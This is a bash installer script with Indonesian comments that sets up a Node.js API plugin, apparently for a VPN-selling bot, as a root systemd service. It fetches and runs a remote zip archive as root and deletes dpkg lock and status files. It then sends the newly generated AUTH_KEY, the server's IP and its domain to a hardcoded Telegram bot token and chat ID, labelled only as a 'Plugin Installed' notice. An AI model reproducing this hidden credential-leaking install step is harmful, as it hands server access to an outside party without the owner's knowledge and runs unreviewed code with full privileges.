#!/bin/bash
clear
green="\e[38;5;82m"
red="\e[38;5;196m"
neutral="\e[0m"
orange="\e[38;5;130m"
blue="\e[38;5;39m"
yellow="\e[38;5;206m"
purple="\e[38;5;141m"
bold_white="\e[1;37m"
reset="\e[0m"
pink="\e[38;5;205m"

print_rainbow() {
    local text="$1"
    local length=${#text}
    local start_color=(0 5 0)
    local mid_color=(0 200 0)
    local end_color=(0 5 0)

    for ((i = 0; i < length; i++)); do
        local progress=$(echo "scale=2; $i / ($length - 1)" | bc)

        if (($(echo "$progress < 0.5" | bc -l))); then
            local factor=$(echo "scale=2; $progress * 2" | bc)
            r=$(echo "scale=0; (${start_color[0]} * (1-$factor) + ${mid_color[0]} * $factor)/1" | bc)
            g=$(echo "scale=0; (${start_color[1]} * (1-$factor) + ${mid_color[1]} * $factor)/1" | bc)
            b=$(echo "scale=0; (${start_color[2]} * (1-$factor) + ${mid_color[2]} * $factor)/1" | bc)
        else
            local factor=$(echo "scale=2; ($progress - 0.5) * 2" | bc)
            r=$(echo "scale=0; (${mid_color[0]} * (1-$factor) + ${end_color[0]} * $factor)/1" | bc)
            g=$(echo "scale=0; (${mid_color[1]} * (1-$factor) + ${end_color[1]} * $factor)/1" | bc)
            b=$(echo "scale=0; (${mid_color[2]} * (1-$factor) + ${end_color[2]} * $factor)/1" | bc)
        fi

        printf "\e[38;2;%d;%d;%dm%s" "$r" "$g" "$b" "${text:$i:1}"
    done
    echo -e "$reset"
}

cek_status() {
    status=$(systemctl is-active --quiet $1 && echo "aktif" || echo "nonaktif")
    if [ "$status" = "aktif" ]; then
        echo -e "${green}GOOD${neutral}"
    else
        echo -e "${red}BAD${neutral}"
    fi
}

setup_bot() {
    # Hapus jika file /usr/bin/api-ari.zip ada
    if [ -f /usr/bin/api-ari.zip ]; then
        rm -f /usr/bin/api-ari.zip
        echo "File /usr/bin/api-ari.zip dihapus."
    fi

# Hapus jika direktori atau file /usr/bin/api-ari ada
    if [ -e /usr/bin/api-ari ]; then
        rm -rf /usr/bin/api-ari >/dev/null 2>&1
    fi
    
    NODE_VERSION=$(node -v 2>/dev/null | grep -oP '(?<=v)\d+' || echo "0")
    rm /var/lib/dpkg/stato* >/dev/null 2>&1
    rm /var/lib/dpkg/lock* >/dev/null 2>&1

    if [ "$NODE_VERSION" -lt 20 ]; then
        echo -e "${yellow}Installing or upgrading Node.js to version 20...${neutral}"
        curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - || echo -e "${red}Failed to download Node.js setup${neutral}"
        apt-get install -y nodejs || echo -e "${red}Failed to install Node.js${neutral}"
        npm install -g npm@latest
    else
        echo -e "${green}Node.js is already installed and up-to-date (v$NODE_VERSION), skipping...${neutral}"
    fi

    if [ ! -f /usr/bin/api-ari/api.js ]; then
        curl -sL "https://raw.githubusercontent.com/xyzstoree/v7old/main/limit/api-ari.zip" -o /usr/bin/api-ari.zip
        cd /usr/bin
        unzip api-ari.zip >/dev/null 2>&1
        rm api-ari.zip*
        chmod +x api-ari/*
        cd
    fi

    if ! npm list --prefix /usr/bin/api-ari express child_process >/dev/null 2>&1; then
        npm install --prefix /usr/bin/api-ari express child_process
    fi

    # Generate AUTH_KEY random (6 karakter)
    NEW_AUTH_KEY=$(openssl rand -hex 3)
    AUTH_KEY_COUNT=$(grep -c "export AUTH_KEY=" /etc/profile)

    if [ "$AUTH_KEY_COUNT" -gt 1 ]; then
        sed -i '/export AUTH_KEY=/d' /etc/profile
        echo "export AUTH_KEY=\"$NEW_AUTH_KEY\"" >> /etc/profile
    elif [ "$AUTH_KEY_COUNT" -eq 1 ]; then
        echo "AUTH_KEY already exists, no changes made."
    else
        echo "export AUTH_KEY=\"$NEW_AUTH_KEY\"" >> /etc/profile
    fi

    source /etc/profile

    SERVER_IP=$(curl -s ipv4.icanhazip.com)
    DOMAIN=$(cat /etc/xray/domain 2>/dev/null || echo "(Domain not set)")

    export KEYAPI=8681894724:AAEH_ZDs98e8rbs9_4_NXlYoDYdf2JMjEKE
    export CHATID=1962241851
    grep -q "botapi.conf" /etc/profile || echo "source /etc/botapi.conf" >> /etc/profile
    source /etc/botapi.conf

    MESSAGE="---- *Plugin Installed* ----
 *Auth Key:* \`$AUTH_KEY\`
 *Server IP:* \`$SERVER_IP\`
 *Domain:* \`$DOMAIN\`"

    curl -s -X POST "https://api.telegram.org/bot$KEYAPI/sendMessage" \
        -d "chat_id=$CHATID" \
        -d "text=$MESSAGE" \
        -d "parse_mode=Markdown" >/dev/null 2>&1

    echo -e "${green}...Setup selesai${neutral}"
}

server_app() {
        # Hapus service apivpnlite.service jika sudah ada
    if [ -f /etc/systemd/system/apivpnlite.service ]; then
        systemctl stop apivpnlite.service >/dev/null 2>&1
        systemctl disable apivpnlite.service >/dev/null 2>&1
        rm -f /etc/systemd/system/apivpnlite.service
        systemctl daemon-reload >/dev/null 2>&1
        echo "Service apivpnlite.service lama dihapus."
    fi

    cat > /etc/systemd/system/apivpnlite.service <<EOF
[Unit]
Description=App Bot sellvpn Service
After=network.target

[Service]
ExecStart=/bin/bash /usr/bin/apivpnlite
Restart=always
User=root
Environment=PATH=/usr/bin:/usr/local/bin
Environment=NODE_ENV=production
WorkingDirectory=/usr/bin

[Install]
WantedBy=multi-user.target
EOF

    echo '#!/bin/bash' > /usr/bin/apivpnlite
    echo "source /etc/profile" >>/usr/bin/apivpnlite
    echo "cd /usr/bin/api-ari" >>/usr/bin/apivpnlite
    echo "node api.js" >>/usr/bin/apivpnlite
    chmod +x /usr/bin/apivpnlite

    CEK_PORT=$(lsof -i:9443 | awk 'NR>1 {print $2}' | sort -u)
    if [[ ! -z "$CEK_PORT" ]]; then
        echo "Menutup proses pada port 9443..."
        echo "$CEK_PORT" | xargs kill -9
    fi

    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable apivpnlite.service >/dev/null 2>&1
    systemctl start apivpnlite.service >/dev/null 2>&1
    systemctl restart apivpnlite.service >/dev/null 2>&1

    printf "\033[5A\033[0J"
    echo -e "Status Server is "$(cek_status apivpnlite.service)""
    m-sellvpn
}

setup_bot
server_app
